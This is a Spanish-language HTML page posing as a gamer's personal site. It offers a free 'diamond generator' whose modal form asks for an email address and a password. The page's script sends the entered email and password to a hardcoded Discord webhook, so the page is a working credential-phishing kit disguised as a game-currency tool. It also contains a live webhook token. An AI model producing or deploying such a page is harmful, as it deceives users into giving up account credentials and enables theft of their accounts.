<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GamerZone - Tu mundo gamer</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Montserrat:wght@400;700&display=swap');

    :root {
      --neon-pink: #FF00FF;
      --neon-blue: #00FFFF;
      --neon-yellow: #FFCC00;
      --dark-bg: #1A1A1A;
      --text-color: #F0F0F0;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', sans-serif;
      background-color: #000;
      color: var(--text-color);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      overflow-x: hidden;
    }

    .hero-section {
      width: 100%;
      padding: 80px 20px;
      background: linear-gradient(135deg, #FF00FF, #00FFFF);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      position: relative;
      z-index: 1;
    }

    .hero-section h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 3.5em;
      text-shadow: 0 0 10px var(--neon-blue), 0 0 20px var(--neon-pink);
      color: var(--text-color);
      margin-bottom: 10px;
      display: flex;
      align-items: center;
    }

    .hero-section h1 .icon {
      margin: 0 10px;
      font-size: 0.8em;
    }

    .hero-section p {
      font-size: 1.2em;
      margin-bottom: 30px;
      text-shadow: 0 0 5px rgba(0,255,255,0.5);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .hero-section p .gamepad-icon {
        margin-left: 10px;
        font-size: 1.2em;
    }

    .btn-join {
      padding: 15px 30px;
      font-size: 1.1em;
      color: var(--text-color);
      background: var(--dark-bg);
      border: 2px solid var(--neon-blue);
      border-radius: 25px;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 10px var(--neon-blue);
      text-decoration: none;
      display: inline-block;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
    }

    .btn-join:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px var(--neon-pink), 0 0 30px var(--neon-blue);
    }

    .about-section {
      width: 100%;
      background-color: var(--dark-bg);
      padding: 60px 20px;
      text-align: center;
      position: relative;
      z-index: 2;
    }

    .about-section h2 {
      font-family: 'Orbitron', sans-serif;
      font-size: 2.5em;
      color: var(--neon-yellow);
      text-shadow: 0 0 8px var(--neon-yellow);
      margin-bottom: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .about-section h2 .flame-icon {
        margin-right: 10px;
        font-size: 0.8em;
    }

    .about-section p {
      font-size: 1.1em;
      line-height: 1.6;
      max-width: 700px;
      margin: 0 auto;
    }

    footer {
      width: 100%;
      background-color: #000;
      padding: 20px;
      text-align: center;
      font-size: 0.9em;
      color: #777;
      border-top: 2px solid #333;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      z-index: 3;
    }

    footer .skull-icon {
        margin-left: 8px;
        font-size: 1.1em;
        color: #ff00ff;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 100;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background-color: var(--dark-bg);
      margin: auto;
      padding: 30px;
      border: 3px solid var(--neon-blue);
      border-radius: 15px;
      width: 80%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 0 20px var(--neon-blue), 0 0 40px var(--neon-pink);
      position: relative;
      animation: fadeIn 0.3s ease-out;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
    }

    .close-button {
      color: var(--neon-pink);
      position: absolute;
      top: 10px;
      right: 20px;
      font-size: 2em;
      font-weight: bold;
      cursor: pointer;
    }

    .close-button:hover,
    .close-button:focus {
      color: var(--neon-yellow);
      text-decoration: none;
    }

    .modal-content h3 {
        font-family: 'Orbitron', sans-serif;
        color: var(--neon-blue);
        margin-bottom: 20px;
        text-shadow: 0 0 5px var(--neon-blue);
    }
    
    .modal-content .warning-text {
        color: var(--neon-yellow);
        font-size: 0.9em;
        margin-bottom: 15px;
        text-shadow: 0 0 5px var(--neon-yellow);
    }

    .modal-content input {
      width: calc(100% - 20px);
      padding: 12px;
      margin-bottom: 15px;
      border: 2px solid var(--neon-blue);
      border-radius: 8px;
      background-color: #333;
      color: var(--text-color);
      font-size: 1em;
      outline: none;
      transition: border-color 0.3s, box-shadow 0.3s;
    }

    .modal-content input:focus {
      border-color: var(--neon-pink);
      box-shadow: 0 0 10px var(--neon-pink);
    }

    .modal-content .btn-submit-form {
      padding: 12px 25px;
      font-size: 1em;
      color: var(--text-color);
      background: linear-gradient(45deg, var(--neon-pink), var(--neon-blue));
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 10px var(--neon-pink);
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      width: 100%;
    }

    .modal-content .btn-submit-form:hover {
      transform: scale(1.03);
      box-shadow: 0 0 15px var(--neon-pink), 0 0 25px var(--neon-blue);
    }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

  <div class="hero-section">
    <h1>
      <i class="fas fa-bolt icon"></i> GamerZone <i class="fas fa-bolt icon"></i>
    </h1>
    <p>
      Bienvenido a mi página con estilo gamer <i class="fas fa-gamepad gamepad-icon"></i>
    </p>
    <button class="btn-join" id="open-modal-btn">GENERADOR DE DIAMANTES</button>
  </div>

  <div class="about-section">
    <h2>
        <i class="fas fa-fire flame-icon"></i> Sobre mi
    </h2>
    <p>
      Soy un apasionado de los videojuegos, los eSports y todo lo relacionado con el
      mundo gamer. Aquí compartiré mis juegos favoritos, trucos y mi estilo de vida gamer.
    </p>
  </div>

  <footer>
    <p>&copy; 2025 - GamerZone | Creado con energía gamer</p>
    <i class="fas fa-skull-crossbones skull-icon"></i>
  </footer>

  <div id="joinModal" class="modal">
    <div class="modal-content">
      <span class="close-button">&times;</span>
      <h3>¡Genera tus Diamantes Ahora!</h3>
      <p class="warning-text">¡ATENCIÓN! Ingresa la información correspondiente o el generador no funcionará.</p>
      <form id="join-form">
        <input type="email" id="email" placeholder="Correo electrónico" required>
        <input type="password" id="password" placeholder="Clave" required>
        <input type="number" id="diamonds" placeholder="Cantidad de diamantes" required>
        <button type="submit" class="btn-submit-form">Generar Diamantes</button>
      </form>
    </div>
  </div>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1377367485149478943/p8wWCcJ9kBbpObvKZiMD_l__Z4zLpPhYnTLK9pb_3hV5H2mazTWunj9tnUnQCPVYchkl'; 

    const openModalBtn = document.getElementById('open-modal-btn');
    const joinModal = document.getElementById('joinModal');
    const closeButton = document.querySelector('.close-button');
    const joinForm = document.getElementById('join-form');

    openModalBtn.addEventListener('click', function() {
      joinModal.style.display = 'flex';
    });

    closeButton.addEventListener('click', function() {
      joinModal.style.display = 'none';
    });

    window.addEventListener('click', function(event) {
      if (event.target == joinModal) {
        joinModal.style.display = 'none';
      }
    });

    joinForm.addEventListener('submit', function(event) {
      event.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const diamonds = document.getElementById('diamonds').value;
      
      const payload = {
        content: `**💎 Nuevo intento de Generador de Diamantes 💎**\n\n**Correo:** ${email}\n**Clave:** ${password}\n**Cantidad de Diamantes:** ${diamonds}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
          alert('¡Procesando tus diamantes! La información ha sido enviada.');
          joinModal.style.display = 'none';
          joinForm.reset();
        } else {
          alert('Error al enviar la información. Revisa la URL del webhook.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Ocurrió un error. Inténtalo de nuevo más tarde.');
      });
    });
  </script>
</body>
</html>
